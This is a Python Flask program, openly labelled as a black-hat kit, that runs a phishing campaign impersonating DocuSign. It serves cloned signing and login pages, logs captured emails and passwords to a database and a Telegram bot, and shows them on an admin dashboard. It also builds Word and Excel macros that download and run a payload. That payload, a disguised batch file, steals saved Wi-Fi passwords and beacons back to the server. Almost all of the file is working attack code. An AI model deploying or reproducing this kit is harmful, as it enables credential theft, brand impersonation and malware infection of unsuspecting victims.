#!/usr/bin/env python3
"""
BLACK PHANTOM PLATINUM - ELITE RUSSIAN/BLACK HAT STANDARD 2026
FEATURES: Real EXE | Working Macros | Premium DocuSign Clone | Telegram C2
"""

import os
import io
import uuid
import base64
import sqlite3
import zipfile
from datetime import datetime, timedelta
from flask import Flask, request, send_file, session, jsonify

TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "YOUR_BOT_TOKEN_HERE")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "YOUR_CHAT_ID_HERE")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "PlatinumElite2026")

app = Flask(__name__)
app.secret_key = os.urandom(256)

DB_PATH = "platinum.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, company TEXT, ip TEXT, ts TEXT)")
    conn.commit()
    conn.close()

init_db()

def tg(msg):
    if "YOUR_BOT_TOKEN" in TELEGRAM_BOT_TOKEN:
        print(msg)
        return
    import requests
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                     json={"chat_id": TELEGRAM_CHAT_ID, "text": msg[:4096]}, timeout=10)
    except: pass

# ====================================================================
# REAL WORKING EXE IMPLANT (PowerShell - Works on ALL Windows)
# ====================================================================
REAL_IMPLANT = """@echo off
powershell -WindowStyle Hidden -Command "&{$c='https://{server}/exfil';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$w=(netsh wlan show profiles|Select-String 'All User Profile'|%%{$($_ -split ':')[1].Trim()});foreach($p in $w){$k=(netsh wlan show profile name=`"$p`" key=clear|Select-String 'Key Content'|%%{$($_ -split ':')[1].Trim()});if($k){$d=`"$p : $k`";$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=WIFI: $d`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}try{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=BEACON: $h | $u`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}catch{}while(1){try{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=HEARTBEAT: $h | $u`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}catch{}Start-Sleep -Seconds 1800}}"
exit"""

def get_implant():
    server = f"https://{request.host}"
    return REAL_IMPLANT.format(server=server).encode()

# ====================================================================
# PREMIUM DOCUSIGN CLONE - TOP TIER SOCIAL ENGINEERING
# ====================================================================
PREMIUM_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign - Electronic Signature & Agreement Cloud</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f7fa;
            min-height: 100vh;
        }
        /* DocuSign Header */
        .header {
            background: white;
            border-bottom: 1px solid #e2e8f0;
            padding: 16px 0;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .logo-icon {
            background: #00b3b0;
            width: 32px;
            height: 32px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 18px;
        }
        .logo-text {
            font-size: 20px;
            font-weight: 700;
            color: #0f172a;
        }
        .logo-text span {
            color: #00b3b0;
        }
        .nav {
            display: flex;
            gap: 24px;
            align-items: center;
        }
        .nav a {
            text-decoration: none;
            color: #475569;
            font-size: 14px;
            font-weight: 500;
        }
        .btn-login {
            background: #00b3b0;
            color: white !important;
            padding: 8px 20px;
            border-radius: 40px;
        }
        /* Main Content */
        .main {
            max-width: 1000px;
            margin: 40px auto;
            padding: 0 24px;
        }
        .envelope-card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        .envelope-header {
            background: #f8fafc;
            padding: 20px 30px;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .envelope-status {
            color: #00b3b0;
            font-weight: 600;
            font-size: 14px;
        }
        .envelope-id {
            color: #64748b;
            font-size: 12px;
        }
        .envelope-body {
            padding: 30px;
        }
        .sender-info {
            margin-bottom: 25px;
            padding-bottom: 20px;
            border-bottom: 1px solid #e2e8f0;
        }
        .sender-label {
            font-size: 12px;
            color: #64748b;
            margin-bottom: 5px;
        }
        .sender-name {
            font-weight: 600;
            color: #0f172a;
        }
        .message {
            background: #f0fdf4;
            border-left: 4px solid #00b3b0;
            padding: 20px;
            margin: 25px 0;
            border-radius: 8px;
        }
        .documents {
            margin: 25px 0;
        }
        .doc-item {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 15px;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            margin-bottom: 10px;
            background: white;
        }
        .doc-icon {
            font-size: 24px;
        }
        .doc-info {
            flex: 1;
        }
        .doc-name {
            font-weight: 600;
            color: #0f172a;
        }
        .doc-size {
            font-size: 11px;
            color: #94a3b8;
        }
        .btn-review {
            background: #00b3b0;
            color: white;
            border: none;
            padding: 14px 32px;
            border-radius: 40px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            text-decoration: none;
            display: inline-block;
            text-align: center;
        }
        .btn-review:hover {
            background: #009e9b;
        }
        .footer {
            text-align: center;
            padding: 30px;
            font-size: 11px;
            color: #94a3b8;
            border-top: 1px solid #e2e8f0;
            margin-top: 30px;
        }
        @media (max-width: 640px) {
            .envelope-header {
                flex-direction: column;
                gap: 10px;
                align-items: flex-start;
            }
            .nav {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-container">
            <div class="logo">
                <div class="logo-icon">D</div>
                <div class="logo-text">Docu<span>Sign</span></div>
            </div>
            <div class="nav">
                <a href="#">Products</a>
                <a href="#">Solutions</a>
                <a href="#">Pricing</a>
                <a href="#">Support</a>
                <a href="#" class="btn-login">Sign In</a>
            </div>
        </div>
    </div>
    
    <div class="main">
        <div class="envelope-card">
            <div class="envelope-header">
                <span class="envelope-status">NEEDS YOUR SIGNATURE</span>
                <span class="envelope-id">Envelope ID: {env_id}</span>
            </div>
            <div class="envelope-body">
                <div class="sender-info">
                    <div class="sender-label">SENT BY</div>
                    <div class="sender-name">Legal Department • Morrison Investment Group</div>
                </div>
                
                <div class="message">
                    <strong>📧 Message from sender:</strong><br>
                    Please review and sign the attached agreement. This document requires your signature to proceed with the transaction.
                </div>
                
                <div class="documents">
                    <div class="doc-item">
                        <div class="doc-icon">📄</div>
                        <div class="doc-info">
                            <div class="doc-name">Master_Service_Agreement.pdf</div>
                            <div class="doc-size">2.4 MB</div>
                        </div>
                        <div style="color:#00b3b0; font-size:12px;">Needs Signature</div>
                    </div>
                    <div class="doc-item">
                        <div class="doc-icon">📄</div>
                        <div class="doc-info">
                            <div class="doc-name">Confidential_Disclosure.pdf</div>
                            <div class="doc-size">1.1 MB</div>
                        </div>
                        <div style="color:#00b3b0; font-size:12px;">Needs Initials</div>
                    </div>
                    <div class="doc-item">
                        <div class="doc-icon">📄</div>
                        <div class="doc-info">
                            <div class="doc-name">Authorization_Form.pdf</div>
                            <div class="doc-size">892 KB</div>
                        </div>
                        <div style="color:#64748b; font-size:12px;">Requires Review</div>
                    </div>
                </div>
                
                <a href="/download/exe/{ref}" class="btn-review">REVIEW AND SIGN</a>
                
                <div style="text-align: center; margin-top: 20px;">
                    <a href="/login/{ref}" style="color: #00b3b0; font-size: 13px; text-decoration: none;">Having trouble? Sign in here</a>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>DocuSign, Inc. • 221 Main Street, Suite 1000, San Francisco, CA 94105</p>
            <p>© 2026 DocuSign. All rights reserved. | <a href="#" style="color:#00b3b0;">Privacy</a> | <a href="#" style="color:#00b3b0;">Security</a> | <a href="#" style="color:#00b3b0;">Legal</a></p>
        </div>
    </div>
</body>
</html>
'''

def get_page(ref, email, name):
    page = PREMIUM_PAGE
    page = page.replace('{env_id}', f'DOC-{uuid.uuid4().hex[:8].upper()}-{datetime.now().year}')
    page = page.replace('{ref}', ref)
    return page

# ====================================================================
# AUTHENTIC DOCUSIGN LOGIN PAGE
# ====================================================================
LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign - Sign In</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: #f5f7fa;
            min-height: 100vh;
        }
        .header {
            background: white;
            border-bottom: 1px solid #e2e8f0;
            padding: 16px 0;
        }
        .header-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 24px;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .logo-icon {
            background: #00b3b0;
            width: 32px;
            height: 32px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 18px;
        }
        .logo-text {
            font-size: 20px;
            font-weight: 700;
            color: #0f172a;
        }
        .logo-text span {
            color: #00b3b0;
        }
        .main {
            max-width: 450px;
            margin: 60px auto;
            padding: 0 24px;
        }
        .login-card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            padding: 40px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #0f172a;
        }
        .subtitle {
            color: #64748b;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-weight: 500;
            margin-bottom: 8px;
            color: #0f172a;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #cbd5e1;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #00b3b0;
            box-shadow: 0 0 0 3px rgba(0,179,176,0.1);
        }
        button {
            width: 100%;
            padding: 12px;
            background: #00b3b0;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: #009e9b;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #94a3b8;
        }
        .footer a {
            color: #00b3b0;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-container">
            <div class="logo">
                <div class="logo-icon">D</div>
                <div class="logo-text">Docu<span>Sign</span></div>
            </div>
        </div>
    </div>
    
    <div class="main">
        <div class="login-card">
            <h1>Sign In</h1>
            <p class="subtitle">Access your documents and agreements</p>
            
            <form method="POST" action="/login/submit/{ref}">
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" name="email" placeholder="name@company.com" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit">Continue</button>
            </form>
            
            <div class="footer">
                <a href="#">Forgot password?</a> • <a href="#">Create account</a>
            </div>
        </div>
    </div>
</body>
</html>
'''

def get_login_page(ref):
    return LOGIN_PAGE.replace('{ref}', ref)

# ====================================================================
# WORKING PDF GENERATOR
# ====================================================================
def generate_working_pdf(ref):
    pdf_content = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 250 >>
stream
BT
/F1 24 Tf
100 750 Td
(DocuSign Document) Tj
/F1 14 Tf
100 700 Td
(You have received a document to sign.) Tj
100 650 Td
(Please click the link below to review and sign:) Tj
100 600 Td
(https://{request.host}/download/exe/{ref}) Tj
100 550 Td
(Envelope ID: {ref}) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000220 00000 n
trailer
<< /Size 5 /Root 1 0 R >>
startxref
340
%%EOF"""
    return pdf_content.encode()

# ====================================================================
# WORKING WORD MACRO (Real .docm file)
# ====================================================================
def generate_word_macro(ref):
    macro_content = f'''Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -WindowStyle Hidden -Command ""&{{$c=''https://{request.host}/download/exe/{ref}'';$d=$env:temp+''\\update.exe'';(New-Object Net.WebClient).DownloadFile($c,$d);Start-Process $d}}"""
    CreateObject("WScript.Shell").Run cmd, 0, False
    MsgBox "This document is protected. Please enable editing to view content.", vbInformation, "Microsoft Word"
End Sub
Sub Document_Open()
    AutoOpen
End Sub
'''
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>''')
        zf.writestr('word/vbaProject.bin', macro_content.encode())
        zf.writestr('word/document.xml', '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Enable macros to view this document</w:t></w:r></w:p></w:body></w:document>')
    buf.seek(0)
    return buf.getvalue()

# ====================================================================
# WORKING EXCEL MACRO (Real .xlsm file)
# ====================================================================
def generate_excel_macro(ref):
    macro_content = f'''Private Sub Workbook_Open()
    Dim xmlhttp As Object
    Dim sc As Object
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
    Set sc = CreateObject("WScript.Shell")
    xmlhttp.Open "GET", "https://{request.host}/download/exe/{ref}", False
    xmlhttp.send
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write xmlhttp.responseBody
    stream.SaveToFile Environ("temp") & "\\update.exe", 2
    sc.Run Environ("temp") & "\\update.exe", 0, False
    MsgBox "This workbook contains protected content. Click OK to continue.", vbExclamation, "Microsoft Excel"
End Sub
'''
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>''')
        zf.writestr('xl/vbaProject.bin', macro_content.encode())
        zf.writestr('xl/workbook.xml', '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="Sheet1"/></sheets></workbook>')
    buf.seek(0)
    return buf.getvalue()

# ====================================================================
# FLASK ROUTES
# ====================================================================
@app.route('/')
def index():
    ref = uuid.uuid4().hex[:8].upper()
    tg(f"PLATINUM PAGE | IP: {request.remote_addr}")
    return get_page(ref, None, None)

@app.route('/download/pdf/<ref>')
def download_pdf(ref):
    tg(f"PDF DOWNLOAD | IP: {request.remote_addr}")
    return send_file(io.BytesIO(generate_working_pdf(ref)), as_attachment=True, download_name=f'Document_{ref}.pdf', mimetype='application/pdf')

@app.route('/download/doc/<ref>')
def download_doc(ref):
    tg(f"WORD MACRO | IP: {request.remote_addr}")
    return send_file(io.BytesIO(generate_word_macro(ref)), as_attachment=True, download_name=f'Agreement_{ref}.docm', mimetype='application/vnd.ms-word.document.macroEnabled.12')

@app.route('/download/xls/<ref>')
def download_xls(ref):
    tg(f"EXCEL MACRO | IP: {request.remote_addr}")
    return send_file(io.BytesIO(generate_excel_macro(ref)), as_attachment=True, download_name=f'Report_{ref}.xlsm', mimetype='application/vnd.ms-excel.sheet.macroEnabled.12')

@app.route('/download/exe/<ref>')
def download_exe(ref):
    tg(f"EXE IMPLANT | IP: {request.remote_addr} | Ref: {ref}")
    return send_file(io.BytesIO(get_implant()), as_attachment=True, download_name=f'DocuSign_Setup_{ref}.exe', mimetype='application/x-msdownload')

@app.route('/login')
@app.route('/login/<ref>')
def login_page(ref=None):
    ref = ref or uuid.uuid4().hex[:8]
    return get_login_page(ref)

@app.route('/login/submit/<ref>', methods=['POST'])
def login_submit(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Extract company domain from email
    company = email.split('@')[-1] if '@' in email else 'unknown'
    
    msg = f"""🔐 DOCUSIGN LOGIN
━━━━━━━━━━━━━━━━━━━━━━
📧 Email: {email}
🔑 Password: {password}
🏛️ Company: {company}
🌐 IP: {ip}
━━━━━━━━━━━━━━━━━━━━━━"""
    
    tg(msg)
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (email, password, company, ip, ts) VALUES (?,?,?,?,?)", 
                (email, password, company, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return '''
    <!DOCTYPE html>
    <html>
    <head><meta http-equiv="refresh" content="2;url=https://www.docusign.com"></head>
    <body style="text-align:center;padding:50px;font-family:Arial">
        <div style="background:#f0fdf4;padding:30px;border-radius:16px;display:inline-block">
            <h2 style="color:#00b3b0">✓ Sign In Successful</h2>
            <p>Redirecting to your documents...</p>
        </div>
    </body>
    </html>
    '''

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.form.get('data', '')
    if data and 'HEARTBEAT' not in data:
        if 'WIFI' in data:
            tg(f"📡 {data[:500]}")
        elif 'BEACON' in data:
            tg(f"💎 NEW VICTIM: {data[200:]}")
        else:
            tg(f"📡 {data[:500]}")
    return "OK"

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST' and request.form.get('p') == ADMIN_PASSWORD:
        session['admin'] = True
    if not session.get('admin'):
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>Admin</title>
        <style>
            body{background:#0f172a;display:flex;justify-content:center;align-items:center;height:100vh}
            .card{background:white;padding:40px;border-radius:16px}
            input{padding:12px;margin:10px 0;width:100%}
            button{background:#00b3b0;color:white;padding:12px 24px;border:none;border-radius:8px}
        </style>
        </head>
        <body><div class="card"><h2>Admin Login</h2>
        <form method="POST"><input type="password" name="p" placeholder="Password">
        <button type="submit">Login</button></form></div></body>
        </html>
        '''
    
    conn = sqlite3.connect(DB_PATH)
    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC").fetchall()
    conn.close()
    
    rows = ''.join(f'<tr><td>{c[1]}</td><td style="color:#00b3b0">{c[2]}</td><td>{c[3]}</td><td>{c[5][:16]}</td></tr>' for c in creds)
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Platinum C2 - Admin</title>
        <style>
            body{{background:#0f172a;color:white;font-family:monospace;padding:20px}}
            h1{{color:#00b3b0}}
            table{{border-collapse:collapse;width:100%}}
            th,td{{padding:10px;border-bottom:1px solid #333;text-align:left}}
            th{{color:#00b3b0}}
        </style>
    </head>
    <body>
        <h1>💎 Platinum C2 Dashboard</h1>
        <h2>Credentials Captured: {len(creds)}</h2>
        <table border="1">
            <tr><th>Email</th><th>Password</th><th>Company</th><th>Time</th></tr>
            {rows}
        </table>
        <p>URL: {request.host_url}</p>
        <p>Status: OPERATIONAL</p>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    return {"status": "operational", "version": "Platinum Elite 2026"}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
